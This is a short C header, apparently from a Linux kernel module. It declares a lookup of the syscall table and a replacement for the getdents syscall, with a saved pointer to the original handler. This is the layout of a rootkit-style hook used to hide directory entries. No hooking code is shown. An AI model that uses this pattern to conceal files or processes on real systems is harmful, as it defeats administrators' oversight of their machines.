
#ifndef _HOOKING_H
#define _HOOKING_H

#include <linux/kallsyms.h>		/* finding addresses of syscalls */
#include <uapi/asm/unistd.h>	/* syscall numbers */
#include <linux/dirent.h>		/* dirent struct */
#include <asm/page.h>			/* definition of PAGE_OFFSET */
#include <linux/uaccess.h>		/* required to include <asm/uaccess.h> */
#include <asm/uaccess.h>

unsigned long *find_syscall_table (void);

typedef asmlinkage long (*sys_getdents_t) (unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count);

asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count);

extern sys_getdents_t sys_getdents_original;

#endif /* _HOOKING_H */